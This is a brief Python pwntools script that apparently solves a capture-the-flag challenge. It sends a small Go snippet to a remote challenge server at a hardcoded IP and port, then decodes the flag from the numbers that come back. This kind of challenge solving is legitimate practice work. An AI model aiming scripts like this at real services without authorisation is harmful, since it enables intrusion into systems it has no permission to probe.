from pwn import*

p = remote('123.56.96.75',30775)
payload = '''
func hack() {
	
	rates := []uint64{0xFF}
	for star ,rate := range rates{
		if star+1 < 1{
			panic("")
		}
		println(rate)
	}
}
'''
p.sendafter('code:',payload + '#')
p.recvuntil('4531949\n')
FLAG  = ''
for i in range(0x2D):
	FLAG += chr(int(p.recvline(),10) - 1)
log.info('FLAG:\t' + FLAG)
pause()
p.close()
